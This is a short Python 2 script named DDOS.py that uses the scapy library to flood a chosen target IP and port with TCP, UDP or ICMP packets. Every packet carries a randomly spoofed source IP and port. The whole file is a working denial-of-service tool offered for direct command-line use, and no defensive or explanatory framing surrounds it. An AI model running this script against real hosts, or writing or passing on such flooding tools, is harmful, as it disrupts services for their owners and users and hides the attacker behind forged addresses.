# DDOS.py
# -*- coding:utf-8 -*-
import socket
import random
import sys
import threading
from scapy.all import *

usage ="""############# HELP #################
python DDOS.py tcp  ip port flag count
python DDOS.py udp  ip port count
python DDOS.py icmp ip count
####################################"""

def SpoofIP():
    return "%i.%i.%i.%i"%(random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))

def SpoofPort():
    return "%i"%(random.randint(1,254))

def TCPPacket(data):
    #print data
    src_ip 		= SpoofIP()
    src_port	= SpoofPort()
    network_layer   = IP(src=src_ip , dst=data[0])
    transport_layer = TCP(sport=int(src_port) , dport=int(data[1]) , flags=str(data[2]))
    print "TCP -> SRC IP : {} DST IP : {} SRC PORT : {} DST PORT : {} FLAG : {}".format(src_ip.ljust(15," ") , data[0] , str(src_port).ljust(5 ," ") , data[1] , data[2])
    send(network_layer/transport_layer,verbose=False)

def UDPPacket(data):
    src_ip		= SpoofIP()
    src_port	= SpoofPort()
    network_layer	= IP(src=src_ip , dst=data[0])
    transport_layer = UDP(sport=int(src_port) , dport=int(data[1]))
    print "UDP -> SRC IP : {} DST IP : {} SRC PORT : {} DST PORT : {}".format(src_ip.ljust(15," ") , data[0] , str(src_port).ljust(5 ," ") , data[1])
    send(network_layer/transport_layer,verbose=False)

def ICMPPacket(data):
    src_ip		=  SpoofIP()
    src_port	=  SpoofPort()
    network_layer	=  IP(src=src_ip , dst=data[0])/ICMP()
    print "ICMP -> SRC IP : {} DST IP : {} ".format(src_ip.ljust(15," "),data[0])

    send(network_layer,verbose=False)
if __name__ == "__main__":
    if len(sys.argv) < 2 or len(sys.argv)> 6:
        print usage
        sys.exit(1)
    else:
        tmp = sys.argv[1:]
        if   str(tmp[0]).lower() == "tcp" and len(tmp) == 5:
            tmp = tmp[1:]
            for i in range(int(tmp[3])):
                TCPPacket(tmp)

        elif str(tmp[0]).lower() == "udp" and len(tmp) == 4:
            tmp = tmp[1:]
            for i in range(int(tmp[2])):
                UDPPacket(tmp)

        elif str(tmp[0]).lower() == "icmp" and len(tmp) == 3:
            tmp = tmp[1:]
            for i in range(int(tmp[1])):
                ICMPPacket(tmp)

        else:
            print usage
            sys.exit(1)




